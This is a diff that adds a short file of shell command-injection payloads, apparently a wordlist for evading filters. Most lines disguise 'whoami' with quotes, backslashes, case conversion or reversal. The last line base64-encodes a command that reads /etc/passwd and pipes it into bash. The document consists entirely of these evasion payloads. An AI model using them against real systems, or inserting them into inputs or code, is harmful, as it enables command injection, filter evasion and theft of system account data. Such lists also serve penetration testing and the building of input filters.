@@ -1,0 +1,8 @@
+whoami
+w'h'o'am'i
+w"h"o"am"i
+who$@ami
+w\ho\am\i
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(rev<<<'imaohw')
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
